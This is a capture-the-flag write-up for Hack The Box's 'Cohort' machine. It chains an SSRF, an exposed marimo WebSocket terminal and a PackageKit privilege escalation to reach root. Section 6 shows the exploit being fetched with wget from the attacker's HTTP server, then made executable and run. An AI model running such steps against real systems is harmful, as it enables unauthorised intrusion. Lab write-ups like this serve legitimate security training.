#  Hack The Box — Cohort

**OS:** Linux
**Difficulty:** easy
**Status:** Rooted 

---

##  Introduction

Cohort is a Linux machine where the attack chain starts with a web application and eventually leads to a shell as the `marimo` user.

The final privilege escalation was done through **PackageKit** using **CVE-2026-41651**.

### Attack Chain

```text
Web Enumeration
      ↓
SSRF
      ↓
Internal Service Discovery
      ↓
Marimo Terminal
      ↓
Shell as marimo
      ↓
PackageKit
      ↓
CVE-2026-41651
      ↓
Root
```

---

# 1. Enumeration

First, I scanned the target:

```bash
nmap -Pn -sV -p- 10.129.x.x
```

The main open ports were:

```text
22/tcp   SSH
80/tcp   HTTP
443/tcp  HTTPS
```

The web server was running **nginx** and HTTPS was using the hostname:

```text
cohort.htb
```

So I added the target to `/etc/hosts`:

```text
10.129.x.x    cohort.htb
```

The HTTPS service was working, although TLS 1.2 had to be used for some requests.

---

# 2. Finding the Internal Service

During the web enumeration, an **SSRF vulnerability** was discovered.

The SSRF allowed the server to make requests to internal services that were not directly accessible from outside.

By using the SSRF functionality, internal ports and services could be discovered.

One of the interesting internal services was the **marimo notebook**.

The internal hostname was discovered as:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

I added it to `/etc/hosts`:

```text
10.129.x.x    nb-1be3782a8afd3ad5.cohort.htb
```

---

# 3. Getting a Shell

The interesting endpoint was:

```text
/terminal/ws
```

It was a WebSocket terminal.

I connected to it using `websocat`:

```bash
./websocat -k wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

This gave me a shell as:

```text
marimo@cohort:~$
```

I checked the current user:

```bash
id
```

and confirmed that I was running as the `marimo` user.

At this point, the user flag was already obtained.

---

# 4. Privilege Escalation

Now the goal was to move from `marimo` to `root`.

I checked the services running on the machine and found:

```text
packagekit.service
```

This was interesting because the installed **PackageKit** version was affected by:

**CVE-2026-41651**

This is a privilege-escalation vulnerability in PackageKit.

So the reasoning was:

```text
Find PackageKit
      ↓
Check its version
      ↓
Search for vulnerabilities affecting that version
      ↓
CVE-2026-41651
```

---

# 5. Preparing the Exploit

The target did not have the development packages required to compile the exploit.

For example:

```bash
ls /usr/include/glib-2.0
```

returned:

```text
No such file or directory
```

So instead of compiling on the target, I compiled the exploit on my Kali machine.

First, I downloaded/obtained the exploit source:

```text
CVE-2026-41651.c
```

Then installed the required development packages on Kali:

```bash
sudo apt install pkg-config libglib2.0-dev
```

I compiled it with:

```bash
gcc -o exploit CVE-2026-41651.c `pkg-config --cflags --libs glib-2.0 gio-2.0` -Wall
```

I verified the binary:

```bash
file exploit
```

It returned an x86-64 ELF executable.

---

# 6. Transfer the Exploit

I started a simple HTTP server on Kali:

```bash
python3 -m http.server 8080 --bind 10.10.14.106
```

Then, from the `marimo` shell:

```bash
wget http://10.10.14.106:8080/exploit -O exploit
```

After downloading it:

```bash
chmod +x exploit
```

---

# 7. Getting Root

Finally, I executed the exploit:

```bash
./exploit
```

The exploit successfully escalated my privileges.

I verified the result with:

```bash
id
```

and confirmed that I had root privileges.

Then I read the root flag:

```bash
cat /root/root.txt
```
<img width="600" height="423" alt="image" src="https://github.com/user-attachments/assets/084822e5-3780-4e95-b647-e29733d0a11e" />

 **Root obtained!**

---

#  Full Attack Chain

```text
Cohort web application
        ↓
       SSRF
        ↓
Internal service discovery
        ↓
Marimo notebook
        ↓
/terminal/ws
        ↓
Shell as marimo
        ↓
PackageKit discovered
        ↓
CVE-2026-41651
        ↓
Compile exploit on Kali
        ↓
Transfer exploit to target
        ↓
./exploit
        ↓
ROOT
```

---

## Lessons Learned

* Always enumerate web applications carefully.
* SSRF can expose services that are supposed to be internal.
* A WebSocket endpoint can sometimes provide access even when the main application is protected.
* When an exploit cannot be compiled on the target, it can often be compiled locally and transferred to the machine.
* After getting a low-privileged shell, checking installed services and their versions is important for privilege escalation.

---

## Tools Used

`nmap` · `curl` · `websocat` · `wget` · `gcc` · `pkg-config` · `Python HTTP Server`

---

# 🏁Cohort — Rooted

Another HTB box completed. 
